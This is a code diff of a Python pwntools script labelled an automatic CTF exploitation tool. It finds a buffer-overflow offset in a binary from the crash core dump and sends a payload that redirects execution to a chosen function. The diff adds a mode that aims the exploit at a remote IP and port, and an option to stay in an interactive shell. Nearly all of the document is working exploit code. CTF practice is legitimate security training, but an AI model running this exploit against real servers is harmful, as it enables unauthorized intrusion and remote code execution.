@@ -1,7 +1,9 @@
+#!/usr/bin/python3
+
 from pwn import *
+import os
 import sys
 import subprocess
-import pyperclip
 import argparse
 from termcolor import colored
 
@@ -11,7 +13,6 @@ context.log_level = "error"
 ## BANNER ##
 
 def print_banner(title=""):
-    subprocess.call("clear")
     print(colored ("""
     ____                 ________  __________            __
    / __ \_      ______  / ____/ /_/ __/_  __/___  ____  / /
@@ -38,32 +39,35 @@ if __name__ == "__main__":
     print_banner()
 
     parser = argparse.ArgumentParser(description="Auto PWN tool for CTF")
-    parser.add_argument('-vv', action="store_true", dest="MoreVerbose", required=False, help="Max Verbose (debug)")
-    parser.add_argument('-v', action="store_true", dest="Verbose", required=False, help="Verbose (info)")
-    parser.add_argument('-g', action="store_true", dest="GdbDebug", required=False, help="Attach GDB")
-    parser.add_argument('-f', action="store", dest="File", required=True, help="File to PWN")
-    parser.add_argument('-t', action="store", dest="Target", required=True, help="Target Function")
+    parser.add_argument('-vv', action="store_true", dest="moreVerbose", required=False, help="Max Verbose (debug)")
+    parser.add_argument('-v', action="store_true", dest="verbose", required=False, help="Verbose (info)")
+    parser.add_argument('-g', action="store_true", dest="gdbDebug", required=False, help="Attach GDB")
+    parser.add_argument('-f', action="store", dest="file", required=True, help="File to PWN")
+    parser.add_argument('-t', action="store", dest="target", required=True, help="Target Function")
     parser.add_argument('--offset', action="store_true", dest="offset", required=False, help="Print offset Instruction Pointer")
-    parser.add_argument('--shell', action="store_true", dest="Shell", required=False, help="Stay interactive")
+    parser.add_argument('--shell', action="store_true", dest="shell", required=False, help="Stay interactive")
+    parser.add_argument('--remote', action="store_true", dest="remote", required=False, help="Exploit remote server")
+
 
     results = parser.parse_args()
-    File = context.binary = results.File
-    Target = results.Target
-    elf = ELF(File)
+    file = context.binary = results.file
+    target = results.target
+    elf = ELF(file)
 
-    if (results.Verbose):
+    if (results.verbose):
         context.log_level = "info"
-    if (results.MoreVerbose):
+    if (results.moreVerbose):
         context.log_level = "debug"
 
-    Target = "elf.symbols.Target".replace("Target",Target)
+    assert target in elf.symbols
+    target = elf.symbols.get(target)
 
 
     # Generate a cyclic pattern so that we can auto-find the offset
     payload = cyclic(1000)
 
     # Run the process once so that it crashes
-    io=process(File)
+    io = process(file)
     io.sendline(payload)
     io.wait()
 
@@ -80,20 +84,31 @@ if __name__ == "__main__":
         offset=cyclic_find(core.read(core.rsp,4))
 
     if results.offset:
-        print("Offset: {}".format(offset))
+        print("\n[*] Offset: {}".format(offset))
 
     payload = flat({
-        offset: eval(Target)
+        offset: target
     })
 
     
-    io = process(File)
-    if results.GdbDebug:
+    if(results.remote):
+        ip = input("IP/DOMAIN: ").strip()
+        port = input("PORT: ")
+        io = remote(ip,port)
+    else:
+        io = process(file)
+
+    if results.gdbDebug:
         gdb.attach(io)
+
     io.send(payload)
-    if results.Shell:
+
+    if results.shell:
         io.interactive()
     else:   
-        io.sendline(b"\n")
+        io.sendline(b"\n"*5)
         print("\n[*] Possible flag:")
-        print(colored ("\t{}\n".format(io.recv()), "green"))
+        print(colored ("\t{}\n".format(io.recvall()), "green"))
+    
+    del core
+    os.remove('core')
